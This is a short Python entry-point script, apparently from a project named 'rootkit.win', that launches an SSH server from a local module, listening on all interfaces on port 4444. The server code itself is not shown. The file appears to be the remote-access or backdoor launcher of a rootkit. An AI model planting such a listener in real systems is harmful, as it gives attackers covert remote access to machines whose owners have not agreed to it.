#!/usr/bin/env python3

"""rootkit.win entrypoint, spawns SSH server"""

import os
from src.server import SshServer

if __name__ == "__main__":
    ssh_key = os.path.join(os.getcwd(), "key")
    server = SshServer(ssh_key)
    server.start(address="0.0.0.0", port=4444)
